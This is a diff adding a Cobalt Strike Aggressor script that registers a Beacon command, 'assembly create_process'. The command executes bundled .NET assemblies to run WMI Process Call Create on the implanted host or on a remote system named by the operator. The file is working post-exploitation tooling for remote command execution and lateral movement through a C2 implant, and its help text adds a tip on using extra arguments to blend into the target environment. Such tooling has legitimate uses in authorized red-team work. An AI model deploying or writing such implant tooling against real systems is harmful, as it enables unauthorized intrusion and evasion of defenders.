@@ -1,0 +1,182 @@
+#	ALIAS:	CREATE_PROCESS
+# $1 => Beacon ID
+# $2 => System
+# $3 => Command
+# $4 => Args
+
+# put: Supporting Function(s)
+sub funct_create_process_argparse {
+	global('$safety');
+	@param = @('-s','-c','-a');
+	if (iff($2 in @param, true, false)) {
+		if ($2 eq '-s') {
+			return %(idx => '1', arg => $3);
+		}
+		else if ($2 eq '-c') {
+			return %(idx => '2', arg => $3);
+		}
+		else if ($2 eq '-a') {
+			return %(idx => '3', arg => $3);
+		}
+	}
+	else {
+		berror($1, "Not a valid Parameter \($2\): Allowed Parameters: -s, -c, -a");
+		$safety = "False";
+		return;
+	}
+}
+
+alias("assembly create_process", {
+		local('$bid %arg1 %arg2 %arg3');
+		global('@params $sysa $cmda $arga $cpargs $safety');
+		clear(@params);
+		$safety = "True";
+		
+		# Check for Number of Arguements
+		if (size(@_) < 4) {
+			berror($1, "create_process: Not enough Parameters/Arguements supplied");
+			beacon_command_detail("create_process");
+			return;
+		}
+		else if (size(@_) > 8) {
+			berror($1, "create_process: Too many Parameters/Arguements supplied");
+			beacon_command_detail("create_process");
+			return;
+		}
+		else if (size(@_) >= 4) {
+			if (iff("-c" in @_, false, true)) {
+				berror($1, "create_process: '-c' is a required parameter");
+				beacon_command_detail("create_process");
+				return;
+			}
+
+		}
+		
+		# Task
+		try {
+			
+			# Print Information to Beacon Console.
+			binput($1, "[ Executing WMI: Process Call Create ]");
+			
+			# Print Results to Beacon Console.
+			# Parse Arguements
+	
+			%arg1 = funct_create_process_argparse($1, $3, $4);
+			push(@params, %arg1);
+			
+			if ($5 ne $null || $6 ne $null) {
+				%arg2 = funct_create_process_argparse($1, $5, $6);
+				push(@params, %arg2);
+			}
+			else {
+				%arg2 = %(idx => '1', arg => "");
+				push(@params, %arg2);
+			}
+			
+			if ($7 ne $null || $8 ne $null){
+				%arg3 = funct_create_process_argparse($1, $7, $8);
+				push(@params, %arg3);
+			}
+			else {
+				%arg3 = %(idx => '3', arg => "");
+				push(@params, %arg3);
+			}
+			
+			if ($safety !eq "False") {
+			
+				# Beginning Task
+				btask($1, "Executing WMI: Process Call Create (T000)", "T000");
+				
+				# Log Tasking to Event Log.
+				elog("\cC[+] Executing WMI: Process Call Create on Implant ID: \o" . beacon_info( $1 , "id" ) . " (" . beacon_info($1, "computer") . ")");
+			
+				sort({ return $1['idx'] <=> $2['idx'];}, @params);
+				
+				foreach $argument (@params) {
+					if ($argument['idx'] eq '1'){
+					
+						if ($argument['arg'] ne $null || $argument['arg'] ne "") {
+							$sysa = $argument['arg'];
+						}
+						else {
+							$sysa = "127.0.0.1";
+						}
+					}
+					else if ($argument['idx'] eq '2'){
+						$cmda = $argument['arg'];
+					}
+					else if ($argument['idx'] eq '3'){
+						if ($argument['arg'] ne $null || $argument['arg'] ne "") {
+							$arga = $argument['arg'];
+						}
+						else {
+							$arga = $null;
+						}
+					}
+				}
+				
+				# Main Code
+				# Create_Process <system> <command> <args>
+				if ($arga ne "" || $arga ne $null) {
+					$cpargs = $sysa . " " . $cmda . " " . $arga;
+				}
+				else {
+					$cpargs = $sysa . " " . $cmda;
+				}
+				
+				if (-is64 $1) {
+					if ("x86" !isin beacon_info($1, "barch")) {
+						bexecute_assembly($1, script_resource("_assemblies/create_process/create_process_x64_3.5.exe"), $cpargs);
+					}
+					else {
+						bexecute_assembly($1, script_resource("_assemblies/create_process/create_process_x86_3.5.exe"), $cpargs);
+					}
+				}
+				else{
+					bexecute_assembly($1, script_resource("_assemblies/create_process/create_process_x86_3.5.exe"), $cpargs);
+				}
+				
+				# Print Information to Script Console.
+				println(
+					"\nPRINTED INFORMATION: CREATE_PROCESS => "          . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+					. "\nExecuting WMI: Process Call Create."
+					. "\n\tSystem: " . $sysa
+					. "\n\tCommand: " . $cmda
+					. "\n\tArguments: " . $arga
+				);
+				
+				# Task Complete
+			}
+			else {
+				# Print Information to Script Console.
+				println(
+					"\nPRINTED INFORMATION: CREATE_PROCESS => "          . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+					. "\nFailed to Execute WMI: Process Call Create."
+				);
+				
+				# Log Failed Tasking to Event Log.
+				elog("\c4[-] Failed to Execute WMI: Process Call Create on Implant ID: \o" . beacon_info( $1 , "id" ) . " (" . beacon_info($1, "computer") . ")");
+				return;
+			}
+		}
+		catch $exception {
+			
+			#Print Error to Script Console.
+			println(
+				"\nERROR INFORMATION: CREATE_PROCESS => " . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+				. "\nCREATE_PROCESS: " . $exception
+			);
+			
+			# Print Error and Return.
+			berror($1, "CREATE_PROCESS: " . $exception);
+			return;
+		}
+	}
+);
+
+#	ALIAS REGISTER: CREATE_PROCESS
+beacon_command_register(
+	"assembly create_process",
+	"\cD" . "[*] .NET \(3.5\): Run WMIC Process Call Create" . "\o",
+	"Synopsis: create_process [-s <system>] -c <command> [-a <arguments>]\n\nRun WMIC Process Call Create.\n\n\t-s <system> :\(Default: 127.0.0.1\) Local\\Remote System to Run Process Call Create on.\n\t-c <command> :\(*Required\) Command to Run.\n\t-a <arguments> : Supply Arguments \(if required\).\n\n*NOTE: You can supply arguments to beacon even if not needed. This can help create blending in Target environment."
+ );
